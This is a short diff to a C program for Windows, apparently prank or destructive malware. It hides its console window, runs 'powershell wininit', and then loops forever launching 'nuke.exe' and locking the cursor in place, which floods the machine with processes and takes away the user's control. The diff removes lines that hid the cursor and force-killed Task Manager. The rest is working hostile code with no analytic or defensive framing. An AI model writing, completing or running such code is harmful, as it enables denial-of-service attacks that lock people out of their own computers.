@@ -13,11 +13,9 @@
 int main()
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
-	ShowCursor(FALSE);
 	system("powershell wininit");
 	for (;;) {
 		system("start nuke.exe");
 		SetCursorPos(200, 200);
-		system("taskkill /f /im Taskmgr.exe");
 	}
 }
